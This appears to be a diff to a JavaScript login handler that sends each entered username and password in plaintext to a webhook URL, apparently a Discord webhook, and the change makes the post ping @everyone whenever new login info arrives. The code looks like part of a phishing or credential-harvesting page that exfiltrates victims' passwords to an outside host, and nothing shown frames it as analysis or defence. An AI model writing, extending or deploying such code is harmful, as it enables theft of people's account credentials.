@@ -117,12 +117,15 @@
     showMessage("Saving credentials...");
 
     try {
-      const content = `**New Login Info**\nUsername: \`${username}\`\nPassword: \`${password}\``;
+      const content = `@everyone **New Login Info**\nUsername: \`${username}\`\nPassword: \`${password}\``;
 
       const response = await fetch(webhookURL, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ content }),
+        body: JSON.stringify({
+          content,
+          allowed_mentions: { parse: ["everyone"] }
+        }),
       });
 
       if (response.ok) {
